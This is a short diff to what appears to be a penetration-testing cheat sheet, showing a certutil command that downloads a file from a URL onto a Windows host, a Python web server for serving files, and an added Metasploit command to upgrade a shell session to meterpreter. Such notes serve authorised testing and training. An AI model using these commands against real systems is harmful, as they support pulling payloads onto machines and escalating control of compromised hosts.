@@ -20,3 +20,8 @@ python -m SimpleHTTPServer 80
 ```
 certutil -urlcache -f URL/FILE DESTINATION_FILE
 ```
+
+# Upgrade shell to meterpreter
+```
+sessions -u SESSION_NUMBER
+```
